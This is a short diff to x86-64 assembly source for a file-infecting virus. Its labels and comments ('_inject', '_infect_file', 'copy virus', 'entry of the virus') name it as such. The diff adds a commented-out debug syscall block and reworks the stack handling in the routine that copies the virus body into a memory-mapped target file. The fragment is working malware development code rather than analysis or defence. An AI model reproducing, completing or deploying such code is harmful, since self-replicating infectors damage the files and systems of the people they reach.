@@ -68,6 +68,11 @@ _inject:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus
+; = DEBUG
+;			mov rdi, r8
+;			mov rax, 11
+;			syscall
+; =
 
 	%ifdef DEBUG
 		mov rdi, r8
@@ -602,12 +607,9 @@ _infect_file: ; (string rdi, stat rsi)
 			sub rdx, 8 * 4
 			; copy virus
 			add rdi, r13 ; addr pointer -> mmap
-			mov rax, rdi
-			push rax
 			add rdi, 8 * 4
 			mov rsi, r8
 			call _ft_memcpy
-			pop rdi
 			mov rax, rdi
 
 			.params:
